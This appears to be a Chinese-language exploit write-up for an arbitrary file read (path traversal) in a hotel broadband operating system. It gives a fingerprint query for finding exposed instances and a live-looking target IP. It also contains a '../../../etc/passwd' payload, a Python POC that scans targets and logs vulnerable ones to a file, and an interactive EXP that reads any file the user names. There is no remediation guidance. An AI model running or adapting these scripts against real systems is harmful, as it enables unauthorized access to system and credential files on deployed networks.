## 一、资产搜索

```
app="安美数字-酒店宽带运营系统"
```

## 二、网站测试

```
https://219.159.104.201:9898
```

## 三、验证漏洞

```
/user/weather.php?Lang=../../../etc/passwd
```

![image-20240904211021014](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240904211021014.png)

## 四、POC

```
def poc(target):
    payload = "/user/weather.php?Lang=../../../etc/passwd"
    try:
        res1 = requests.get(target,verify=False,timeout=5)
        if res1.status_code == 200:
            res2 = requests.get(target+payload,verify=False,timeout=5)
            res3 = json.loads(res2.text)
            if "root" in res3['CreatTime']:
                with open("result.txt","a",encoding='utf-8') as f:
                    f.write(f"该网站[+]{target}存在任意文件读取漏洞\n")
                    print(f"该网站[+]{target}存在任意文件读取漏洞")
                    return True
            else:
                print(f"该网站[+]{target}不存在任意文件读取漏洞")
        else:
            print("连接超时，请重试")
    except Exception as e:
        print(e)
```

## 五、EXP

```
def exp(target):
    payload = "/user/weather.php?Lang=../../.."
    while True:
        cmd = input("请输入要查看的文件，从/开始(q退出)\n>>>>>>>>>>>>>>")
        if cmd == 'q':
            exit()
        res1 = requests.get(target, verify=False,timeout=5)
        if res1.status_code == 200:
            res2 = requests.get(target + payload + cmd, verify=False,timeout=5)
            res3 = json.loads(res2.text)
            if res3['CreatTime'] == '':
                print("该文件不存在，请重新输入！！")
            else:
                print(res3)
```

## 六、测试结果

![](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240904213927247.png)

![image-20240904213834925](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240904213834925.png)

![image-20240905182811850](https://imagescf.oss-cn-beijing.aliyuncs.com/img/image-20240905182811850.png)